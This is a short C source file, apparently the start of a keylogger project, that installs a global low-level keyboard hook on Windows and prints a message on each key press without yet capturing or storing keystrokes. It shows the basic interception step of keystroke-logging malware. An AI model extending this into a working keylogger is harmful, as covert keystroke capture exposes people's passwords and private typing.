#include "keylogger.h"

HINSTANCE hinst;
static HHOOK handlekeyboard = NULL;

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
{
	printf("i pressed a key!\n");
	return (CallNextHookEx(handlekeyboard, nCode, wparam, lparam));
}

void	setwinhook()
{
	hinst = GetModuleHandle(NULL);
	handlekeyboard = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hinst, 0);
	if (handlekeyboard == NULL)
		printf("c'est nul\n");
	else
		printf("c'est pas nul\n");
	printf("coucou\n");
}

int	main(void)
{
	MSG msg;

	setwinhook();
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return (msg.wParam);
}